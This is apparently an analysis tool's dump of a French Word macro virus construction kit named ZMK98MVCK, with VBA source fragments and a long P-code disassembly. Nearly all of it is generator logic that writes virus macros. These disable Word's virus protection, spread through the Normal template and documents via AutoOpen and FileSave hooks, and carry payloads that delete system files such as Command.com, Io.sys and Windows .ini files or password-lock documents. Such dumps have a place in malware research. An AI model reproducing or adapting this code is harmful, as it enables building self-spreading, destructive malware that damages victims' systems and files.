    MsgBox "Je suis un kit de construction et non un VIRUS..", Title:="ZMK98MVCK"
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
    MsgBox "Je vais vous aider à créer des virus...", vbInformation, "ZMK98MVCK"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Constructor.MSWord.Zmk98
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/Compilation - 16347 bytes
' Line #0:
' Line #1:
' 	Dim (Public) 
' 	VarDefn ChargeCK (As String)
' Line #2:
' 	Dim (Public) 
' 	VarDefn AssTitre (As String)
' Line #3:
' 	Dim (Public) 
' 	VarDefn AssMess (As String)
' Line #4:
' 	Dim (Public) 
' 	VarDefn MDP (As String)
' Line #5:
' 	Dim (Public) 
' 	VarDefn ChMess (As String)
' Line #6:
' 	Dim (Public) 
' 	VarDefn ChTitre (As String)
' Line #7:
' 	Dim (Public) 
' 	VarDefn Titre3 (As String)
' Line #8:
' 	Dim (Public) 
' 	VarDefn Message3 (As String)
' Line #9:
' 	Dim (Public) 
' 	VarDefn Titre2 (As String)
' Line #10:
' 	Dim (Public) 
' 	VarDefn Message2 (As String)
' Line #11:
' 	Dim (Public) 
' 	VarDefn Titre1 (As String)
' Line #12:
' 	Dim (Public) 
' 	VarDefn Message1 (As String)
' Line #13:
' 	Dim (Public) 
' 	VarDefn MacroNM (As String)
' Line #14:
' 	Dim (Public) 
' 	VarDefn MacroDOC (As String)
' Line #15:
' 	Dim (Public) 
' 	VarDefn VirName (As String)
' Line #16:
' 	Dim (Public) 
' 	VarDefn Fichier (As String)
' Line #17:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #18:
' 	LitStr 0x0008 "FileName"
' 	LitStr 0x0007 "Fichier"
' 	LitStr 0x0009 "ZMK98MVCK"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St Fichier 
' Line #19:
' 	LitStr 0x0008 "FileName"
' 	LitStr 0x0003 "Nom"
' 	LitStr 0x0009 "ZMK98MVCK"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St VirName 
' Line #20:
' 	LitStr 0x0009 "MacroType"
' 	LitStr 0x0007 "NameDOC"
' 	LitStr 0x0009 "ZMK98MVCK"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St MacroDOC 
' Line #21:
' 	LitStr 0x0009 "MacroType"
' 	LitStr 0x0006 "NameMN"
' 	LitStr 0x0009 "ZMK98MVCK"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St MacroNM 
' Line #22:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0008 "MessMECT"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St Titre1 
' Line #23:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0008 "MessMECM"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St Message1 
' Line #24:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0006 "MessMT"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St Titre2 
' Line #25:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0006 "MessMM"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St Message2 
' Line #26:
' 	LitStr 0x0008 "MacroPay"
' 	LitStr 0x0003 "Nom"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St ChargeCK 
' Line #27:
' 	Ld Fichier 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #28:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name =""
' 	PrintItemSemi 
' 	Ld VirName 
' 	PrintItemSemi 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #29:
' 	Ld ChargeCK 
' 	Ld MacroNM 
' 	Ne 
' 	LitStr 0x0007 "PayType"
' 	LitStr 0x0004 "Type"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	LitStr 0x0001 "0"
' 	Ne 
' 	And 
' 	Ld ChargeCK 
' 	Ld MacroDOC 
' 	Ne 
' 	LitStr 0x0007 "PayType"
' 	LitStr 0x0004 "Type"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	LitStr 0x0001 "0"
' 	Ne 
' 	And 
' 	Or 
' 	IfBlock 
' Line #30:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Sub "
' 	Ld ChargeCK 
' 	Concat 
' 	PrintItemNL 
' Line #31:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "Application.EnableCancelKey=wdCancelDisabled"
' 	PrintItemNL 
' Line #32:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "Wordbasic.DisableAutoMacros 0"
' 	PrintItemNL 
' Line #33:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "Options.VirusProtection = False"
' 	PrintItemNL 
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Options.SaveNormalPrompt = False"
' 	PrintItemNL 
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "On Error Goto Bye"
' 	PrintItemNL 
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "   Call PayLoad"
' 	PrintItemNL 
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Bye:"
' 	PrintItemNL 
' Line #38:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Sub "
' 	Ld MacroNM 
' 	Concat 
' 	PrintItemNL 
' Line #41:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "'Virus crée par ZMK98MVCK"
' 	PrintItemNL 
' Line #42:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "Application.EnableCancelKey=wdCancelDisabled"
' 	PrintItemNL 
' Line #43:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "Wordbasic.DisableAutoMacros 0"
' 	PrintItemNL 
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "Options.VirusProtection = False"
' 	PrintItemNL 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Options.SaveNormalPrompt = False"
' 	PrintItemNL 
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "On Error Goto Fin"
' 	PrintItemNL 
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0037 "iMacroCount= NormalTemplate.VbProject.VbComponent.Count"
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "For i=1 to iMacroCount"
' 	PrintItemNL 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0037 "     if NormalTemplate.VbProject.VbComponent(i).Name =""
' 	PrintItemSemi 
' 	Ld VirName 
' 	PrintItemSemi 
' 	LitStr 0x0006 "" Then"
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "              "
' 	Ld VirName 
' 	Concat 
' 	LitStr 0x000D "Installed =-1"
' 	Concat 
' 	PrintItemNL 
' Line #51:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "     EndIf"
' 	PrintItemNL 
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Next i"
' 	PrintItemNL 
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "If Not "
' 	Ld VirName 
' 	Concat 
' 	LitStr 0x000E "Installed then"
' 	Concat 
' 	PrintItemNL 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006D "      Application.OrganizerCopy Source:=ActiveDocument.FullName,Destination:=NormalTemplate.FullName, Name:=""
' 	PrintItemSemi 
' 	Ld VirName 
' 	PrintItemSemi 
' 	LitStr 0x0028 "" ,Object:=wdOrganizerObjectProjectItems"
' 	PrintItemNL 
' Line #55:
' 	Ld MacroDOC 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	Ld MacroDOC 
' 	LitStr 0x0009 "AutoClose"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Else"
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006C "     Application.OrganizerCopy Source:=NormalTemplate.FullName,Destination:=ActiveDocument.FullName, Name:=""
' 	PrintItemSemi 
' 	Ld VirName 
' 	PrintItemSemi 
' 	LitStr 0x0028 "" ,Object:=wdOrganizerObjectProjectItems"
' 	PrintItemNL 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "EndIf"
' 	PrintItemNL 
' Line #60:
' 	Ld ChargeCK 
' 	Ld MacroNM 
' 	Eq 
' 	IfBlock 
' Line #61:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "Call PayLoad"
' 	PrintItemNL 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Fin:"
' 	PrintItemNL 
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #65:
' 	Ld MacroDOC 
' 	Ld MacroNM 
' 	Ne 
' 	IfBlock 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Sub "
' 	Ld MacroDOC 
' 	Concat 
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "Application.EnableCancelKey=wdCancelDisabled"
' 	PrintItemNL 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "Wordbasic.DisableAutoMacros 0"
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "Options.VirusProtection = False"
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Options.SaveNormalPrompt = False"
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On Error Goto Finish"
' 	PrintItemNL 
' Line #72:
' 	Ld MacroDOC 
' 	LitStr 0x0008 "FileSave"
' 	Eq 
' 	IfBlock 
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "ActiveDocument.Save"
' 	PrintItemNL 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	Ld MacroDOC 
' 	LitStr 0x000A "FileSaveAs"
' 	Eq 
' 	IfBlock 
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Dialogs(wdDialogFileSaveAs).Show"
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0060 "If ActiveDocument.SaveFormat=wdFormatTemplate or ActiveDocument.SaveFormat=wdFormatDocument then"
' 	PrintItemNL 
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0037 "     ActiveDocument.SaveAs FileFormat:=wdFormatTemplate"
' 	PrintItemNL 
' Line #79:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "EndIf"
' 	PrintItemNL 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	Ld ChargeCK 
' 	Ld MacroDOC 
' 	Eq 
' 	IfBlock 
' Line #82:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "Call PayLoad"
' 	PrintItemNL 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0067 "Application.OrganizerCopy Source:=NormalTemplate.FullName,Destination:=ActiveDocument.FullName, Name:=""
' 	PrintItemSemi 
' 	Ld VirName 
' 	PrintItemSemi 
' 	LitStr 0x0028 "" ,Object:=wdOrganizerObjectProjectItems"
' 	PrintItemNL 
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Finish:"
' 	PrintItemNL 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Sub FileTemplates"
' 	PrintItemNL 
' Line #89:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "Application.EnableCancelKey=wdCancelDisabled"
' 	PrintItemNL 
' Line #90:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "Wordbasic.DisableAutoMacros 0"
' 	PrintItemNL 
' Line #91:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "Options.VirusProtection = False"
' 	PrintItemNL 
' Line #92:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Options.SaveNormalPrompt = False"
' 	PrintItemNL 
' Line #93:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "On Error Goto ErrorFT"
' 	PrintItemNL 
' Line #94:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0006 "Choix1"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	LitStr 0x0003 "Oui"
' 	Eq 
' 	IfBlock 
' Line #95:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "Msgbox ""
' 	PrintItemSemi 
' 	Ld Message1 
' 	PrintItemSemi 
' 	LitStr 0x000B "", Title:=""
' 	PrintItemSemi 
' 	Ld Titre1 
' 	PrintItemSemi 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "ErrorFT:"
' 	PrintItemNL 
' Line #98:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #99:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Sub PayLoad"
' 	PrintItemNL 
' Line #100:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "Application.EnableCancelKey=wdCancelDisabled"
' 	PrintItemNL 
' Line #101:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "Wordbasic.DisableAutoMacros 0"
' 	PrintItemNL 
' Line #102:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "Options.VirusProtection = False"
' 	PrintItemNL 
' Line #103:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Options.SaveNormalPrompt = False"
' 	PrintItemNL 
' Line #104:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "On Error Goto ErrorPL"
' 	PrintItemNL 
' Line #105:
' 	LitStr 0x0007 "PayType"
' 	LitStr 0x0004 "Type"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	IfBlock 
' Line #106:
' 	LitStr 0x0007 "PayMess"
' 	LitStr 0x0008 "MessageM"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St ChMess 
' Line #107:
' 	LitStr 0x0007 "PayMess"
' 	LitStr 0x0008 "MessageT"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St ChTitre 
' Line #108:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "   Msgbox ""
' 	PrintItemSemi 
' 	Ld ChMess 
' 	PrintItemSemi 
' 	LitStr 0x000B "", Title:=""
' 	PrintItemSemi 
' 	Ld ChTitre 
' 	PrintItemSemi 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #109:
' 	EndIfBlock 
' Line #110:
' 	LitStr 0x0007 "PayType"
' 	LitStr 0x0004 "Type"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	IfBlock 
' Line #111:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier1"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	LitStr 0x0003 "Oui"
' 	Eq 
' 	IfBlock 
' Line #112:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "Kill "C:\Autoexec.bat""
' 	PrintItemNL 
' Line #113:
' 	EndIfBlock 
' Line #114:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier2"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	LitStr 0x0003 "Oui"
' 	Eq 
' 	IfBlock 
' Line #115:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Kill "C:\Config.sys""
' 	PrintItemNL 
' Line #116:
' 	EndIfBlock 
' Line #117:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier3"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	LitStr 0x0003 "Oui"
' 	Eq 
' 	IfBlock 
' Line #118:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "Kill "C:\Command.com""
' 	PrintItemNL 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier4"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	LitStr 0x0003 "Oui"
' 	Eq 
' 	IfBlock 
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "Kill "C:\Msdos.sys""
' 	PrintItemNL 
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier5"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	LitStr 0x0003 "Oui"
' 	Eq 
' 	IfBlock 
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "Kill "C:\Io.sys""
' 	PrintItemNL 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier6"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	LitStr 0x0003 "Oui"
' 	Eq 
' 	IfBlock 
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "Kill "C:\Windows\*.ini""
' 	PrintItemNL 
' Line #128:
' 	EndIfBlock 
' Line #129:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier7"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	LitStr 0x0003 "Oui"
' 	Eq 
' 	IfBlock 
' Line #130:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Kill CurDir"
' 	PrintItemNL 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier8"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	LitStr 0x0003 "Oui"
' 	Eq 
' 	IfBlock 
' Line #133:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "Kill "C:\Windows\Command\*.*""
' 	PrintItemNL 
' Line #134:
' 	EndIfBlock 
' Line #135:
' 	EndIfBlock 
' Line #136:
' 	LitStr 0x0007 "PayType"
' 	LitStr 0x0004 "Type"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	IfBlock 
' Line #137:
' 	LitStr 0x0006 "PayMDP"
' 	LitStr 0x0006 "Valeur"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St MDP 
' Line #138:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "   ActiveDocument.SaveAs Password:=""
' 	PrintItemSemi 
' 	Ld MDP 
' 	PrintItemSemi 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #139:
' 	EndIfBlock 
' Line #140:
' 	LitStr 0x0007 "PayType"
' 	LitStr 0x0004 "Type"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	IfBlock 
' Line #141:
' 	LitStr 0x0009 "PayAssist"
' 	LitStr 0x0005 "Titre"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St AssTitre 
' Line #142:
' 	LitStr 0x0009 "PayAssist"
' 	LitStr 0x0007 "Message"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St AssMess 
' Line #143:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "Assistant.Visible=True"
' 	PrintItemNL 
' Line #144:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "With Assistant.NewBalloon"
' 	PrintItemNL 
' Line #145:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "     .Button = msoButtonSetOK"
' 	PrintItemNL 
' Line #146:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "     .Heading =""
' 	PrintItemSemi 
' 	Ld AssTitre 
' 	PrintItemSemi 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #147:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "     .Text =""
' 	PrintItemSemi 
' 	Ld AssMess 
' 	PrintItemSemi 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #148:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 ".Show"
' 	PrintItemNL 
' Line #149:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "End With"
' 	PrintItemNL 
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	LitStr 0x0007 "PayType"
' 	LitStr 0x0004 "Type"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	IfBlock 
' Line #152:
' 	EndIfBlock 
' Line #153:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "ErrorPL:"
' 	PrintItemNL 
' Line #154:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #155:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Sub ToolsMacro"
' 	PrintItemNL 
' Line #156:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "Application.EnableCancelKey=wdCancelDisabled"
' 	PrintItemNL 
' Line #157:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "Wordbasic.DisableAutoMacros 0"
' 	PrintItemNL 
' Line #158:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "Options.VirusProtection = False"
' 	PrintItemNL 
' Line #159:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Options.SaveNormalPrompt = False"
' 	PrintItemNL 
' Line #160:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "On Error Goto ErrorTM"
' 	PrintItemNL 
' Line #161:
' 	LitStr 0x0007 "Message"
' 	LitStr 0x0006 "Choix2"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	LitStr 0x0003 "Oui"
' 	Eq 
' 	IfBlock 
' Line #162:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "Msgbox ""
' 	PrintItemSemi 
' 	Ld Message2 
' 	PrintItemSemi 
' 	LitStr 0x000B "", Title:=""
' 	PrintItemSemi 
' 	Ld Titre2 
' 	PrintItemSemi 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #163:
' 	EndIfBlock 
' Line #164:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "ErrorTM:"
' 	PrintItemNL 
' Line #165:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #166:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Sub ViewVBCode"
' 	PrintItemNL 
' Line #167:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "Application.EnableCancelKey=wdCancelDisabled"
' 	PrintItemNL 
' Line #168:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "Wordbasic.DisableAutoMacros 0"
' 	PrintItemNL 
' Line #169:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "Options.VirusProtection = False"
' 	PrintItemNL 
' Line #170:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
